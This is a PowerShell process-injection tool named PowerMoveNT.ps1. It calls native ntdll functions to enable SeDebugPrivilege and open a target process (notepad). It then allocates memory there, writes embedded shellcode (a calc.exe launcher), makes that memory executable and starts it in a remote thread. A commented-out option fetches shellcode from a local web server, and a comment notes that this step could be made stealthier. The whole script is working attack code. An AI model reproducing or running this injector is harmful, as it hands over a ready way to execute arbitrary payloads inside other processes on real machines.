###
Write-Output "        ____                          __  ___                _   ________"
Write-Output "       / __ \____ _      _____  _____/  |/  /___ _   _____  / | / /_  __/"
Write-Output "      / /_/ / __ \ | /| / / _ \/ ___/ /|_/ / __ \ | / / _ \/  |/ / / /   "
Write-Output "     / ____/ /_/ / |/ |/ /  __/ /  / /  / / /_/ / |/ /  __/ /|  / / /    "
Write-Output "    /_/    \____/|__/|__/\___/_/  /_/  /_/\____/|___/\___/_/ |_/ /_/     "
Write-Output "                  PowerMoveNT.ps1 v0.1 - Author 10N351R"
Write-Output " "

Write-Host "[INIT] Building NTAPI structures"

###  Imports
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class NtApi2 {
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName; // PUNICODE_STRING
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [DllImport("ntdll.dll")]
    public static extern uint NtOpenProcess(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId
    );

    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(
        int Privilege,
        bool Enable,
        bool CurrentThread,
        out bool Enabled
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        uint ZeroBits,
        ref UInt64 RegionSize,
        uint AllocationType,
        uint Protect
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        ref UInt64 NumberOfBytesWritten
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref UInt64 RegionSize,
        uint NewProtect,
        ref uint OldProtect
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        uint CreateFlags,
        IntPtr ZeroBits,
        IntPtr Size,
        IntPtr Unknown,
        IntPtr Unknown2
    );
}
"@ -Language CSharp

### Payload

# Target process
$targetProcName = "notepad"

# Local Payload (ex. msfvenom -p windows/x64/exec CMD=calc.exe)
$shellcode = @(
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
) -as [byte[]]

# Remote Payload (use '<# #>' to comment out the above or completely remove)
#$webClient = New-Object System.Net.WebClient
#$shellcode = $webClient.DownloadData("http://127.0.0.1:8080/payload.shc") # this method can be made wayyyy more stealthy

###  Functions
function Enable-SeDebugPrivilege {
    [bool]$prev = $false
    $status = [NtApi2]::RtlAdjustPrivilege(20, $true, $false, [ref]$prev)  # 20 = SeDebugPrivilege
    return @{ Status = $status; PreviouslyEnabled = $prev }
}

function inject {
    param (
        [IntPtr]$hProcess,
        [byte[]]$pPayload,
        [UInt64]$sPayloadSize
    )

    # Variables
    $STATUS = 0
    $pAddress = [IntPtr]::Zero
    $uOldProtection = 0
    $sSize = $sPayloadSize
    $sNumberOfBytesWritten = 0
    $hThread = [IntPtr]::Zero

    # Allocating memory
    $STATUS = [NtApi2]::NtAllocateVirtualMemory($hProcess, [ref]$pAddress, 0, [ref]$sSize, 0x1000, 0x04) # 0x04 = RW
    if ($STATUS -ne 0) {
        Write-Host "[ERROR] NtAllocateVirtualMemory: FAILED (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        return $false
    } else {
        Write-Host "[MEMORY] NtAllocateVirtualMemory: SUCCESS (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        Write-Host "         Base: 0x$($pAddress.ToString("X")) | Size: $sSize bytes"
    }

    # Writing the payload
    $STATUS = [NtApi2]::NtWriteVirtualMemory($hProcess, $pAddress, $pPayload, $sPayloadSize, [ref]$sNumberOfBytesWritten)
    if ($STATUS -ne 0 -or $sNumberOfBytesWritten -ne $sPayloadSize) {
        Write-Host "[ERROR] NtWriteVirtualMemory: FAILED (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        Write-Host "[ERROR] Bytes Written : $sNumberOfBytesWritten of $sPayloadSize"
        return $false
    } else {
        Write-Host "         NtWriteVirtualMemory: SUCCESS (NTSTATUS: 0x$($STATUS.ToString("X8"))) | $sNumberOfBytesWritten bytes written"
    }

    # Changing the memory's permissions
    $STATUS = [NtApi2]::NtProtectVirtualMemory($hProcess, [ref]$pAddress, [ref]$sPayloadSize, 0x20, [ref]$uOldProtection) # 0x20 = RX
    if ($STATUS -ne 0) {
        Write-Host "[ERROR] NtProtectVirtualMemory: FAILED (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        return $false
    } else {
        Write-Host "         NtProtectVirtualMemory: SUCCESS (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        Write-Host " "
    }

    # Executing the payload via thread
    Write-Host "[THREAD] Executing Thread at Entry Point 0x$($pAddress.ToString("X")) ... "
    $STATUS = [NtApi2]::NtCreateThreadEx([ref]$hThread, 0x1F0FFF, [IntPtr]::Zero, $hProcess, $pAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($STATUS -ne 0) {
        Write-Host "[ERROR] NtCreateThreadEx: FAILED (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        return $false
    } else {
        Write-Host "         NtCreateThreadEx: SUCCESS (NTSTATUS: 0x$($STATUS.ToString("X8")))"
        Write-Host "         Thread ID: $($hThread.ToString())"
        Write-Host " "
    }

    return $true
}

### Execution

# Optionally enable SeDebugPrivilege to open SYSTEM processes
Write-Host "[PRIV] Attempting to enable SeDebugPrivilege..."
$debug = Enable-SeDebugPrivilege
if ($debug.Status -eq 0) {
    Write-Host "[PRIV] SeDebugPrivilege: SUCCESS (NTSTATUS: 0x$($debug.Status.ToString("X8"))), previously enabled: $($debug.PreviouslyEnabled)"
} else {
    Write-Host "[ERROR] SeDebugPrivilege: FAILED (NTSTATUS: 0x$($debug.Status.ToString("X8"))), previously enabled: $($debug.PreviouslyEnabled)"
}

$PROCESS_ALL_ACCESS = 0x001F0FFF # privileges, could probably use less privileges

# resolve the target process
try {
    $targetPid = (Get-Process -Name $targetProcName | Select-Object -First 1).Id
    Write-Host "[TARGET] Process: $targetProcName (PID $targetPid)"
    Write-Host " "
} catch {
    Write-Error "[ERROR] Failed to find process named '$targetProcName'. Ensure it is running."
    exit
}

# Prepare OBJECT_ATTRIBUTES (zeroed/default)
$oa = New-Object NtApi2+OBJECT_ATTRIBUTES
$oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
$oa.RootDirectory = [IntPtr]::Zero
$oa.ObjectName = [IntPtr]::Zero
$oa.Attributes = 0
$oa.SecurityDescriptor = [IntPtr]::Zero
$oa.SecurityQualityOfService = [IntPtr]::Zero

$ci = New-Object NtApi2+CLIENT_ID
$ci.UniqueProcess = [IntPtr] $targetPid
$ci.UniqueThread = [IntPtr]::Zero

Write-Host "[HANDLE] Attempting to obtain handle to target process PID: $targetPid"
[IntPtr]$hProc = [IntPtr]::Zero
$ntStatus = [NtApi2]::NtOpenProcess([ref]$hProc, $PROCESS_ALL_ACCESS, [ref]$oa, [ref]$ci)

# Determine if NtOpenProcess was successful
if ($ntStatus -eq 0) {
    Write-Host "         NtOpenProcess: SUCCESS (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
    Write-Host "         Handle: 0x$($hProc.ToString("X"))"
    Write-Host " "
} else {
    Write-Host "[ERROR] NtOpenProcess: FAILED (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
}

# Inject!
$execute = inject -hProcess $hProc -pPayload $shellcode -sPayloadSize $shellcode.Length

if ($execute) {
    Write-Host "[OK] Injection completed."
} else {
    Write-Host "[ERROR] Injection failed."
}
###